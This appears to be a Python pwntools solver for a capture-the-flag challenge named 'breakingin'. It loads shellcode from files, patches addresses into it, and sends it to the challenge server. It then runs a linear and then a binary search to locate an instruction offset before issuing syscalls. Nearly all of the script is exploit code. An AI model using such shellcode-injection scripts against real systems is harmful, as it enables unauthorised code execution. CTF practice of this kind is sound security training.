#!/bin/python2
from pwn import *
bin='./breakingin'
elf = ELF(bin)


#s = remote('3.87.135.104', '31337')
#s.recvuntil('Password:')
#sleep(5)

#s.send(shellcode + 'a' * ((0x50-0x4)-len(shellcode)) + p8(bump_int) + addr + '\n')


#f = open('./testneg.bin', "rb")
#f = open('./testfuckputs.bin', "rb")
f = open('./find_op.bin', "rb")
shellcode = f.read()
f.close()

f = open('./find_syscall.bin', "rb")
shellcodesys = f.read()
f.close()


#curop = 0x13376968

def check(start):
	myloc = shellcode.find(b'\xAB\xAB\xAB\xAB')
	print('In ' + hex(start))
	#i dont remember how to do an in-place binary replace, so im lazy
	mycode = shellcode.replace(b'\xAB\xAB\xAB\xAB', p32(start))

#	s = process(bin)
	s = remote('breakingin.wpictf.xyz', '31337')
	s.recvuntil('):')
	s.send(str(len(mycode)) + '\n')
	s.recvuntil(':\n')
	s.write(mycode)
	humanread = s.recvuntil('nulls)\n')
	print(humanread)
	result = s.recvall()
	myres = u32(result[myloc:myloc+4])
	s.close()
	print('Myres was ' + hex(myres))
	if 'syscall' in humanread:
		return myres -1, True
	return myres -1, False

def sysc(locstart, sysstart):
	myloc = shellcodesys.find(b'\xAB\xAB\xAB\xAB')
	myloc2 = shellcodesys.find(b'\xCD\xCD\xCD\xCD')
#	print('In ' + hex(start))
	#i dont remember how to do an in-place binary replace, so im lazy
	mycode = shellcodesys.replace(b'\xAB\xAB\xAB\xAB', p32(locstart))
	mycode = mycode.replace(b'\xCD\xCD\xCD\xCD', p32(sysstart))

#	s = process(bin)
	s = remote('breakingin.wpictf.xyz', '31337')

	s.recvuntil('):')
	s.send(str(len(mycode)) + '\n')
	s.recvuntil(':\n')
	s.write(mycode)
	res = s.recvall().partition('nulls)\n')[0].decode('utf-8')
	s.close()
	print(res)


curtry = 0
curop = 0x16
lastop = 0x16

while True:
	curtry+=1
	lastop = curop

	finop, res = check(curop)
	curop = finop-1
	if res:
		break

print('broke at ' + hex(curop) + ' after ' + str(curtry))
print(' between ' + hex(lastop) + ' and ' + hex(curop))


#binary search
while True:
	curtry+=1
	testpoint = (curop-lastop)/2 + lastop
	thisop, res = check(testpoint)
	print(str(res) + ' ' + hex(testpoint) + '-' + hex(curop))
	if res:
		lastop = testpoint
	else:
		curop = testpoint
	if curop == lastop +1:
		break

print('found at ' + hex(lastop) + ' after ' + str(curtry) + ' total tries')


sysc(lastop, 0)
sysc(lastop, 61)
